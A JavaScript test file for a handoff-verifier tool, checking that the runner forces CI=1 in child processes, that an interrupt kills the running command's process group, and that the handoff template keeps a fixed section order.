test("runner: CI is forced to 1 in the child — an inherited CI=false never reaches it (gate 14, bug.20)", async () => {
  const dir = tempDir();
  fs.writeFileSync(
    path.join(dir, "ci.js"),
    "process.stdout.write(String(process.env.CI));",
  );
  const saved = process.env.CI;
  process.env.CI = "false";
  try {
    const r = await mod.defaultRunner([process.execPath, "ci.js"], {
      cwd: dir,
      timeoutMs: 10000,
    });
    assert.equal(r.stdout, "1");
  } finally {
    if (saved === undefined) delete process.env.CI;
    else process.env.CI = saved;
  }
});

test("cli: SIGINT on the verifier kills the running command's process group (CR-7)", async () => {
  const dir = tempDir();
  const pidFile = path.join(dir, "child.pid");
  fs.writeFileSync(
    path.join(dir, "slow.js"),
    `const { spawn } = require("child_process");
     const c = spawn(process.execPath, ["-e", "setTimeout(function(){}, 20000)"], { stdio: "ignore" });
     require("fs").writeFileSync(${JSON.stringify(pidFile)}, String(c.pid));
     setTimeout(function(){}, 20000);`,
  );
  fs.writeFileSync(path.join(dir, "package.json"), SLOW_PACKAGE_JSON);
  fs.writeFileSync(
    path.join(dir, "handoff.md"),
    TABLE_HEADER + "| Slow | `npm test` | **done** |\n",
  );
  const { spawn } = require("child_process");
  const cli = spawn(
    process.execPath,
    [SCRIPT, "handoff.md", "--json", "--timeout", "30"],
    { cwd: dir, stdio: "ignore" },
  );
  // Wait for the grandchild to exist, then interrupt the verifier.
  const deadline = Date.now() + 10000;
  while (!fs.existsSync(pidFile) && Date.now() < deadline)
    await new Promise((r) => setTimeout(r, 50));
  assert.ok(fs.existsSync(pidFile), "the grandchild never started");
  const grandchild = Number(fs.readFileSync(pidFile, "utf8"));
  await new Promise((r) => setTimeout(r, 100));
  cli.kill("SIGINT");
  const code = await new Promise((r) => cli.on("close", r));
  assert.equal(code, 130, "the verifier dies by SIGINT (130)");
  await new Promise((r) => setTimeout(r, 200));
  let alive = true;
  try {
    process.kill(grandchild, 0);
  } catch {
    alive = false;
  }
  if (alive) {
    try {
      process.kill(grandchild, "SIGKILL");
    } catch {
      /* raced */
    }
  }
  assert.equal(
    alive,
    false,
    "the grandchild outlived the interrupted verifier",
  );
});

// ---------------------------------------------------------------------------
// Write mode — the template
// ---------------------------------------------------------------------------

test("template: fixed section order, half-life labels, and the traps section is a pointer only", async () => {
  const t = fs.readFileSync(TEMPLATE, "utf8");
  const headings = [...t.matchAll(/^## (.+)$/gm)].map((m) => m[1]);
  const expected = [
    "1. What to pick up",
    "2. Standing decisions",
    "3. Carried follow-ups",
    "4. Tolerated drift",
    "5. Traps",
    "6. Where the artifacts are",
  ];
  expected.forEach((h, i) =>
    assert.match(
      headings[i] ?? "",
      new RegExp(`^${h.replace(".", "\\.")}`),
      `section ${i + 1}`,
    ),
  );
  assert.match(
    t,
    /\| Check \| Command \| Result \|/,
    "the header table is the state section",
  );
  assert.match(t, /half-life/i);
  const traps = t.split(/^## 5\. Traps.*$/m)[1].split(/^## 6\./m)[0];
  assert.match(
    traps,
    /traps\.md/,
    "the traps section points at the durable home",
  );
  assert.doesNotMatch(traps, /^### /m, "no trap content lives in the handoff");
  assert.ok(
    mod.parseHandoff(t).every((f) => f.source === "table"),
    "the template's own placeholder rows parse",
  );
});
